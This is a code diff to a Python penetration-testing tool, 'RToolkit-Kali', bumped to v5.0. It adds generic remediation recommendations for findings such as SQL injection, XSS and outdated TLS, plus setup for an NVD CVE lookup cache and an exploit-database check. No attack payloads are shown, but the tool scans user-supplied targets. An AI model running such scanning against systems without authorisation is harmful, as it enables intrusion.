+    theoretical = [c for c in cves if c.get("confidence") == "THEORETICAL"]
+    if theoretical:
+        recs.append(f"[VERIFY] {len(theoretical)} THEORETICAL CVE(s) from plugin names — "
+                    "manually verify plugin versions before reporting.")
+
+    # Standard remediation
+    for v in REPORT["vulnerabilities"]:
+        n = v.get("name","").lower()
+        if "sqli" in n or "sql injection" in n:
+            recs.append("Use parameterized queries / prepared statements for database access")
+        if "sensitive file" in n or "waf bypass" in n:
+            recs.append("Remove exposed files; restrict access with .htaccess / nginx rules")
+        if "xss" in n or "cross-site" in n:
+            recs.append("Implement Content-Security-Policy and sanitize all user input")
+        if "tls" in n or "ssl" in n:
+            recs.append("Disable deprecated TLS/SSL protocols; enable TLS 1.2+ only")
+        if "directory listing" in n:
+            recs.append("Disable directory listing in web server config")
+        if "wp plugin" in n or "wordpress" in n:
+            recs.append("Update all WordPress plugins/themes to latest versions")
+
+    # Default recs
+    recs += [
+        "Enable HTTP security headers (HSTS, CSP, XCTO, XFO)",
+        "Implement proper authentication and session management",
+    ]
+
+    # Deduplicate while preserving order
+    seen = set()
+    unique_recs = []
+    for r in recs:
+        if r not in seen:
+            seen.add(r)
+            unique_recs.append(r)
+    return unique_recs[:15]
+
 # ====== CLI ARGUMENTS ======
 def parse_args():
     import argparse as _ap
     p = _ap.ArgumentParser(prog="rtoolkit-kali.py",
-        description="RToolkit-Kali v4.0 — MASTER RED TEAM TOOL",
+        description="RToolkit-Kali v5.0 — OVERPOWERED RED TEAM TOOL",
         epilog="Example: python rtoolkit-kali.py --target example.com --phase 3,5")
     p.add_argument("-t", "--target", help="Target domain/IP (skip interactive prompt)")
     p.add_argument("-p", "--phase", nargs="+", type=int, default=[],
@@ -2130,6 +2951,23 @@ def main():
     check_ssh_keepalive()
 
     RESULTS_DIR.mkdir(exist_ok=True)
+
+    # v5.0: NVD cache initialization
+    global NVD_GLOBAL_CACHE
+    NVD_GLOBAL_CACHE = None
+    if HAS_NVD and cfg("enable_nvd_live", True):
+        cache_days = cfg("nvd_cache_days", 1)
+        api_key = cfg("nvd_api_key", "")
+        from nvd_client import NvdCache as _NvdCache
+        NVD_GLOBAL_CACHE = _NvdCache(api_key=api_key, cache_days=cache_days)
+        if NVD_GLOBAL_CACHE.is_stale():
+            print(f"  {c('NVD cache stale — will query live API',Y)}")
+        else:
+            print(f"  {c('NVD cache ready (fresh)',G)}")
+        REPORT["nvd_cache_date"] = NVD_GLOBAL_CACHE.meta.get("last_updated", "")
+        REPORT["nvd_cache_fresh"] = not NVD_GLOBAL_CACHE.is_stale()
+        print(f"  {c('NVD API:',G)} {'✓ enabled' if HAS_NVD else '✗ disabled'} "
+              f"| {c('Exploit Check:',G)} {'✓ enabled' if HAS_EXPLOIT_CLIENT else '✗ disabled (install exploitdb)'}")
 
     # CLI args or interactive
     if ARGS and ARGS.target:
